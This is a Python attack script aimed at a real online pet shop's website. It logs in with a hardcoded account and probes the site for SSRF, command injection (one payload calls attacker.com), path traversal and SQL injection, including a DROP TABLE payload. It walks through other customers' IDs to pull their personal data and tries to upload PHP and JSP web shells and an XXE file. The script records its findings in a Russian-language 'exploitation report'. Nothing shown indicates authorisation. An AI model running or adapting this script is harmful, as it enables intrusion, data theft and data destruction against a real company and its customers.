#!/usr/bin/env python3
"""Deep vulnerability hunting - test everything"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

found_vulns = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# 1. Test SSRF in all endpoints
print("[*] Testing SSRF...")
ssrf_payloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:22",
    "http://localhost/admin",
    "file:///etc/passwd",
]

endpoints_for_ssrf = [
    "/semiprotected/api/audiences-api/v1/me",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
    "/checkout/api/shop-api/v1/sid",
]

for ep in endpoints_for_ssrf:
    for payload in ssrf_payloads:
        try:
            resp = s.post(f"{base}{ep}", json={"url": payload, "callback": payload}, timeout=3, verify=False)
            if resp.status_code in [200, 201] and ("169.254.169.254" in resp.text or "instance-id" in resp.text.lower()):
                print(f"  [CRITICAL] SSRF: {ep}")
                found_vulns.append({"type": "ssrf", "severity": "CRITICAL", "endpoint": ep, "payload": payload})
        except: pass

# 2. Test Command Injection
print("\n[*] Testing Command Injection...")
cmd_payloads = [
    "; cat /etc/passwd",
    "| whoami",
    "`id`",
    "$(curl attacker.com)",
    "& ping -c 3 127.0.0.1",
]

for ep in endpoints_for_ssrf:
    for payload in cmd_payloads:
        try:
            resp = s.post(f"{base}{ep}", json={"test": payload, "name": payload}, timeout=3, verify=False)
            if resp.status_code in [200, 201] and ("uid=" in resp.text or "root:" in resp.text or "www-data" in resp.text):
                print(f"  [CRITICAL] Command Injection: {ep}")
                found_vulns.append({"type": "command_injection", "severity": "CRITICAL", "endpoint": ep, "payload": payload})
        except: pass

# 3. Test Path Traversal in file operations
print("\n[*] Testing Path Traversal...")
path_payloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

file_endpoints = [
    "/api/file",
    "/api/files",
    "/myaccount/api/file",
    "/semiprotected/api/file",
]

for ep in file_endpoints:
    for payload in path_payloads:
        try:
            resp = s.get(f"{base}{ep}?file={payload}", timeout=3, verify=False)
            if resp.status_code == 200 and "root:" in resp.text:
                print(f"  [CRITICAL] Path Traversal: {ep}")
                found_vulns.append({"type": "path_traversal", "severity": "CRITICAL", "endpoint": ep, "payload": payload})
        except: pass

# 4. Test SQL Injection
print("\n[*] Testing SQL Injection...")
sql_payloads = [
    "' OR '1'='1",
    "1' UNION SELECT 1,2,3--",
    "1'; DROP TABLE users--",
    "1' OR SLEEP(5)--",
]

for ep in endpoints_for_ssrf:
    for payload in sql_payloads:
        try:
            resp = s.get(f"{base}{ep}?id={payload}", timeout=5, verify=False)
            if resp.status_code == 200 and ("error" in resp.text.lower() or "sql" in resp.text.lower() or resp.elapsed.total_seconds() > 4):
                print(f"  [HIGH] Possible SQL Injection: {ep}")
                found_vulns.append({"type": "sql_injection", "severity": "HIGH", "endpoint": ep, "payload": payload})
        except: pass

# 5. Test for real IDOR with different customer IDs
print("\n[*] Testing IDOR with different customer IDs...")
customer_ids = [53260509, 53260633, 1, 2, 100, 999, 1000, 9999, 99999]

for customer_id in customer_ids:
    endpoints = [
        f"/myaccount/api/customer-config/v1/customerconfiguration/{customer_id}",
        f"/myaccount/api/order-details/v3/customer/{customer_id}",
        f"/protected/api/loyalty-management/bonus-points/customer/{customer_id}",
    ]
    for ep in endpoints:
        try:
            resp = s.get(f"{base}{ep}", timeout=3, verify=False)
            if resp.status_code == 200:
                data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
                if isinstance(data, dict) and data:
                    data_str = json.dumps(data)
                    # Check for real user data
                    if any(key in data_str.lower() for key in ['email', 'name', 'address', 'phone', 'order', 'balance']):
                        print(f"  [CRITICAL] IDOR: {ep}")
                        print(f"      Data: {data_str[:300]}")
                        found_vulns.append({
                            "type": "idor",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "customer_id": customer_id,
                            "data": data_str[:500]
                        })
        except: pass

# 6. Test for file upload with various file types
print("\n[*] Testing file upload endpoints...")
upload_endpoints = [
    "/api/upload",
    "/api/file/upload",
    "/myaccount/api/upload",
    "/myaccount/api/avatar",
    "/semiprotected/api/upload",
    "/checkout/api/upload",
]

# SVG XXE
svg_xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'
# PHP shell
php_shell = '<?php system($_GET["cmd"]); ?>'
# JSP shell
jsp_shell = '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); } %>'

for ep in upload_endpoints:
    for filename, content, content_type in [
        ("exploit.svg", svg_xxe, "image/svg+xml"),
        ("shell.php", php_shell, "application/x-php"),
        ("shell.jsp", jsp_shell, "application/x-jsp"),
    ]:
        try:
            files = {'file': (filename, content, content_type)}
            resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
            if resp.status_code in [200, 201, 302]:
                response_text = resp.text
                if "root:" in response_text or "root:x:0:0" in response_text:
                    print(f"  [CRITICAL] File Upload XXE: {ep} ({filename})")
                    found_vulns.append({
                        "type": "file_upload_xxe",
                        "severity": "CRITICAL",
                        "endpoint": ep,
                        "filename": filename
                    })
                elif resp.headers.get('Location'):
                    loc = resp.headers.get('Location')
                    if not loc.startswith('http'):
                        loc = f"{base}{loc}"
                    try:
                        resp2 = s.get(loc, timeout=3, verify=False)
                        if "root:" in resp2.text:
                            print(f"  [CRITICAL] File Upload XXE via location: {ep} -> {loc}")
                            found_vulns.append({
                                "type": "file_upload_xxe",
                                "severity": "CRITICAL",
                                "endpoint": ep,
                                "uploaded_to": loc,
                                "filename": filename
                            })
                    except: pass
        except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'payload' in v:
            print(f"    Payload: {v['payload']}")
        if 'customer_id' in v:
            print(f"    Customer ID: {v['customer_id']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 РЕАЛЬНЫЕ УЯЗВИМОСТИ НАЙДЕНЫ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'payload' in v:
                f.write(f"**Payload:** `{v['payload']}`\n\n")
            if 'customer_id' in v:
                f.write(f"**Customer ID:** `{v['customer_id']}`\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data'][:500]}`\n\n")
            if 'uploaded_to' in v:
                f.write(f"**Uploaded File Location:** `{v['uploaded_to']}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No vulnerabilities found in this round")
    print("  Continuing search...")

print("=" * 70)

